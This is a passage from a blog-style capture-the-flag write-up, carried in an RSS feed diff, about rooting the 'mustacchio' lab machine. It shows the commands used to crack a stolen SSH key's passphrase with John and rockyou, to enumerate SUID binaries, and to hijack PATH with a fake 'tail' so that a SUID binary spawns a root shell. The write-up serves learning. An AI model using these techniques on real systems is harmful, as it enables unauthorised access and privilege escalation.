+Success! We can now see Barry’s private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called “id_rsa_barry”, <strong>making sure that there is no white space</strong>. I changed the permissions on the file using this command:</p>
+<p><code>chmod 400 id_rsa_barry</code></p>
+<p>I went to ssh into the machine and this was my result:</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*mGKSvT93JzuxBhgxAvxBIg.png" alt=""  />
+
+It seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.</p>
+<p><code>$ python3 /usr/share/john/ssh2john.py id_rsa_barry &gt; id_rsa_barry.hash    $ john — wordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash</code></p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*DFe8cHaY9rABFQoOAkr-iA.png" alt=""  />
+
+Great! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.</p>
+<h1 id="privilege-escalation"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*RBrrcp7EVvjb9szz2tLUGg.png" alt=""  />
+
+Privilege Escalation</h1>
+<p>First, I took a look at Barry’s id.</p>
+<p><code>barry@mustacchio:~$ id   uid=1003(barry) gid=1003(barry) groups=1003(barry)</code></p>
+<p>It appears that he is not in any groups that we could use for privilege escalation. I also used <code>sudo -l</code> to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>barry@mustacchio:~$ find / -perm -4000 2&gt;/dev/null  
+</span></span><span style="display:flex;"><span>/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic  
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device  
+</span></span><span style="display:flex;"><span>/usr/lib/policykit-1/polkit-agent-helper-1  
+</span></span><span style="display:flex;"><span>/usr/lib/snapd/snap-confine  
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign  
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
+</span></span><span style="display:flex;"><span>/usr/bin/passwd  
+</span></span><span style="display:flex;"><span>/usr/bin/pkexec  
+</span></span><span style="display:flex;"><span>/usr/bin/chfn  
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp  
+</span></span><span style="display:flex;"><span>/usr/bin/at  
+</span></span><span style="display:flex;"><span>/usr/bin/chsh  
+</span></span><span style="display:flex;"><span>/usr/bin/newgidmap  
+</span></span><span style="display:flex;"><span>/usr/bin/sudo  
+</span></span><span style="display:flex;"><span>/usr/bin/newuidmap  
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd  
+</span></span><span style="display:flex;"><span>**/home/joe/live\_log**  
+</span></span><span style="display:flex;"><span>/bin/ping  
+</span></span><span style="display:flex;"><span>/bin/ping6  
+</span></span><span style="display:flex;"><span>/bin/umount  
+</span></span><span style="display:flex;"><span>/bin/mount  
+</span></span><span style="display:flex;"><span>/bin/fusermount  
+</span></span><span style="display:flex;"><span>/bin/su
+</span></span></code></pre></div><p>Interesting, “live_log” is in Joe’s home directory. Maybe we have permission to execute it.</p>
+<p><code>barry@mustacchio:~$ cd /home/joe &amp;&amp; ls -la   total 28   drwxr-xr-x 2 joe joe 4096 Jun 12 2021 .   drwxr-xr-x 4 root root 4096 Jun 12 2021 ..   -rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log</code></p>
+<p>And we do! When I run it, it appears to launch an application.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4UbZ77EZp3aHOXEHYvNonQ.png" alt=""  />
+
+This isn’t very useful to us because we can’t interact with the application! Instead, I looked further into the file using the <code>strings</code> command. Additionally, I used <code>awk</code> so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.</p>
+<p><code>$ strings live_log | awk ‘length($0) &gt; 15’</code></p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*8nyN1k4x9nZpM1sGpDmSsg.png" alt=""  />
+
+Interesting. There is a path to “access.log” and the full path for the <code>tail</code> command isn’t used. Maybe we can change the PATH variable so that we can use our own “tail” command that gives us root.</p>
+<p>`$ export PATH=/tmp<br>
+$ cd /tmp<br>
+$ echo “/bin/bash -p” &gt; tail<br>
+$ /bin/chmod +x tail<br>
+$ /home/joe/live_log</p>
+<h1 id="usrbinwhoami">/usr/bin/whoami</h1>
+<p>root</p>
+<h1 id="bincat-rootroottxt">/bin/cat /root/root.txt</h1>
+<p>[REDACTED]`</p>
+<p>And it works! Since “live_log” was an SUID binary, we were able to run it as root. We were able to redirect the path from <code>/usr/bin/tail</code> to <code>/tmp/tail</code> which allowed us to run <code>/bin/bash</code> as root, giving us a root shell.</p>
+<p>That’s all! I hope you enjoyed my explanations. Please send me any constructive feedback <a href="https://www.linkedin.com/in/ally-petitt-5a02aa208/">via LinkedIn</a>. Thank you and take care!</p>
+]]></content:encoded>
+    </item>
   </channel>
 </rss>
